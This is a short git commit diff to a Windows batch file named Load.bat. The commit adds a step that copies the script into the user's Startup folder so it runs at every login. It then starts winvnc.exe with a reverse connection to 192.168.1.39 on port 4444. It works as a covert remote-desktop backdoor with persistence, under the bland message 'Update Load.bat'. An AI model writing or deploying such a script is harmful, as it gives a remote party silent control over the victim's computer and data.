966a0e570fd50d5f95865117510dec0789115747
GooseLoose0809 <122241263+GooseLoose0809@users.noreply.github.com>
2024-06-19 21:53:55 -0500

    Update Load.bat

--- Load.bat
+++ Load.bat
@@ -1,4 +1,7 @@
 @echo off
+if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
+  copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+)
 start winvnc.exe -run
-timout /t 1 >nul
-winvnc.exe -connect 192.168.1.39::4444
+timeout /t 1 >nul
+start winvnc.exe -connect 192.168.1.39::4444
